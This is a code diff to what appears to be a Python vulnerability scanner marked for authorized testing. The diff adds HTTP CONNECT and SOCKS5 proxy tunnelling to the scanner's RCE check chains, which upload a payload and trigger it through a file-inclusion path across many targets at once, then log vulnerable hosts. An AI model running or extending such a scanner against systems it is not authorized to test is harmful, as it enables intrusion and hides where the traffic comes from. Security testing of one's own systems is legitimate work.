@@ -51,6 +51,7 @@ For authorized testing only — scan only systems you own or are permitted to
 test.
 """
 import argparse
+import base64
 import concurrent.futures
 import json
 import os
@@ -73,10 +74,76 @@ def say(msg):
         print(msg, flush=True)
 
 
-def send(host, port, method, path, body=b"", headers="", scheme="http",
-         timeout=10.0, verify=False):
+def proxy_tunnel(proxy, host, port, timeout):
+    """Open a transport connection to host:port through `proxy`
+    (http://[user:pass@]h:p via CONNECT, or socks5:// — remote DNS)."""
+    u = urlparse(proxy or "")
+    ptype = (u.scheme or "http").lower()
+    phost, pport = u.hostname, u.port or (1080 if ptype.startswith("socks") else 8080)
+    if not phost:
+        raise OSError("invalid --proxy URL")
+    sock = socket.create_connection((phost, pport), timeout=timeout)
     try:
-        sock = socket.create_connection((host, port), timeout=timeout)
+        if ptype.startswith("socks"):
+            if ptype == "socks4":
+                raise OSError("socks4 not supported (use http:// or socks5://)")
+            u_, p_ = (u.username or "").encode(), (u.password or "").encode()
+            sock.sendall(b"\x05\x01\x02" if u_ else b"\x05\x01\x00")
+            r = sock.recv(2)
+            if len(r) < 2 or r[0] != 5:
+                raise OSError("socks5 greeting failed")
+            if r[1] == 2:
+                sock.sendall(b"\x01" + bytes([len(u_)]) + u_ + bytes([len(p_)]) + p_)
+                r = sock.recv(2)
+                if len(r) < 2 or r[1] != 0:
+                    raise OSError("socks5 auth rejected")
+            elif r[1] != 0:
+                raise OSError("socks5: no acceptable auth method")
+            hb = host.encode()
+            sock.sendall(b"\x05\x01\x00\x03" + bytes([len(hb)]) + hb
+                         + port.to_bytes(2, "big"))
+            r = sock.recv(4)
+            if len(r) < 4 or r[1] != 0:
+                raise OSError(f"socks5 connect failed (rep={r[1] if len(r) > 1 else '?'})")
+            atyp = r[3]
+            if atyp == 1:
+                sock.recv(4)
+            elif atyp == 4:
+                sock.recv(16)
+            else:
+                sock.recv(1)
+                sock.recv(sock.recv(1)[0])
+            sock.recv(2)  # bound port
+        else:
+            req = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n"
+            if u.username:
+                tok = base64.b64encode(f"{u.username}:{u.password or ''}".encode()).decode()
+                req += f"Proxy-Authorization: Basic {tok}\r\n"
+            req += "\r\n"
+            sock.sendall(req.encode())
+            resp = b""
+            while b"\r\n\r\n" not in resp:
+                d = sock.recv(4096)
+                if not d:
+                    raise OSError("proxy closed during CONNECT")
+                resp += d
+            parts = resp.split(b" ", 2)
+            if len(parts) < 2 or parts[1] != b"200":
+                raise OSError("proxy CONNECT failed: "
+                              f"{resp.splitlines()[0].decode('latin-1', 'replace')[:80]}")
+        return sock
+    except (OSError, IndexError):
+        sock.close()
+        raise
+
+
+def send(host, port, method, path, body=b"", headers="", scheme="http",
+         timeout=10.0, verify=False, proxy=None):
+    try:
+        if proxy:
+            sock = proxy_tunnel(proxy, host, port, timeout)
+        else:
+            sock = socket.create_connection((host, port), timeout=timeout)
     except OSError:
         return None
     if scheme == "https":
@@ -173,7 +240,7 @@ def check_chain_a(t, args):
     res = {"marker": mk, "sid": sid}
 
     r = multipart(host, port, args.a_write_path, sid, "x", payload,
-                  scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
+                  scheme=scheme, timeout=args.timeout, verify=args.verify_tls, proxy=args.proxy)
     if r is None:
         res.update(write_status=None, verdict="write request failed", rce=False)
         return res
@@ -199,7 +266,7 @@ def check_chain_a(t, args):
     if args.a_lfi_path:
         url = f"{args.a_lfi_path}?{args.a_lfi_param}={quote(sess_file)}"
         r2 = send(host, port, "GET", url, scheme=scheme,
-                  timeout=args.timeout, verify=args.verify_tls)
+                  timeout=args.timeout, verify=args.verify_tls, proxy=args.proxy)
         res["lfi_status"] = status_of(r2) if r2 else 0
         res["rce"] = bool(r2) and mk in body_of(r2)
     else:
@@ -226,14 +293,14 @@ def check_chain_c(t, args):
         docker_exec(args.docker, f"rm -f {args.output_path}")
 
     r1 = multipart(host, port, args.c_write_path, sid, gadget, "normal.txt",
-                   scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
+                   scheme=scheme, timeout=args.timeout, verify=args.verify_tls, proxy=args.proxy)
     if r1 is None:
         res.update(write_status=None, verdict="write request failed", rce=False)
         return res
     res["write_status"] = status_of(r1)
 
     r2 = multipart(host, port, args.c_read_path, sid, "x", "normal.txt",
-                   scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
+                   scheme=scheme, timeout=args.timeout, verify=args.verify_tls, proxy=args.proxy)
     if r2 is None:
         res.update(read_status=None, verdict="trigger request failed", rce=False)
         return res
@@ -257,7 +324,7 @@ def scan_target(t, args):
     entry = {"target": f"{scheme}://{host}:{port}"}
 
     r = send(host, port, "GET", "/", scheme=scheme, timeout=args.timeout,
-             verify=args.verify_tls)
+             verify=args.verify_tls, proxy=args.proxy)
     if r is None:
         entry["verdict"] = "UNREACHABLE"
         return entry
@@ -354,6 +421,9 @@ def main():
     ap.add_argument("--workers", type=int, default=8)
     ap.add_argument("--verify-tls", action="store_true",
                     help="verify TLS certificates (default: accept self-signed)")
+    ap.add_argument("--proxy", default=None,
+                    help="proxy for scanner->target traffic: http://[user:pass@]host:port "
+                         "or socks5:// (CONNECT/SOCKS5, remote DNS)")
     ap.add_argument("--json", metavar="FILE", help="write full results as JSON")
     ap.add_argument("--log", default="vulnerable.txt",
                     help="append VULNERABLE targets here, deduped across runs; "
